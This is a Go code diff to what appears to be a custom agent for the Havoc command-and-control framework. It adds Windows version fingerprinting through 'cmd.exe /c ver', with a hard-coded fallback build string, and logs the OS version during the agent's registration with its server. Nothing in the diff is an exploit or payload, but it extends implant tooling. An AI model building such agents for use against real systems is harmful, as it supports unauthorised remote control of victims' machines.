@@ -16,6 +16,7 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -205,8 +206,33 @@ func (agent *LinuxAgent) GetProcessName() string {
 }
 
 func (agent *LinuxAgent) GetOSVersion() string {
+	version := "10.0.19045.3448"
 	// 实现 GetOSVersion 方法的逻辑
-	return runtime.GOOS
+	// https://github.com/HavocFramework/Havoc/blob/3bf236c417b3963034ae3722f41bf521f14a3476/teamserver/pkg/agent/agent.go#L288C58-L288C58
+	if runtime.GOOS == "windows" {
+		// 执行 cmd.exe /c ver 命令获取 Windows 版本信息
+		cmd := exec.Command("cmd.exe", "/c", "ver")
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			return version
+		}
+		// 使用正则表达式匹配版本号
+		r, err := regexp.Compile(`\s+(\d+\.\d+\.\d+\.\d+)`)
+		if err != nil {
+			return version
+		}
+
+		// 在命令输出中搜索匹配的子串
+		matches := r.FindStringSubmatch(string(output))
+		if matches == nil {
+			return version
+		}
+		// 获取版本号
+		version = matches[1]
+	} else {
+		version = runtime.GOOS
+	}
+	return version
 }
 
 func (agent *LinuxAgent) Register() bool {
@@ -227,6 +253,7 @@ func (agent *LinuxAgent) Register() bool {
 	registerData.RegisterData.Sleep = uint32(AGENT_SLEEP_SECOND)
 	registerData.RegisterData.ProcessName = agent.GetProcessName()
 	registerData.RegisterData.OSVersion = agent.GetOSVersion()
+	log.Println(registerData.RegisterData.OSVersion)
 	TaskData.Task = AGENT_REGISTER
 	marshal, err := json.Marshal(registerData.RegisterData)
 	if err != nil {
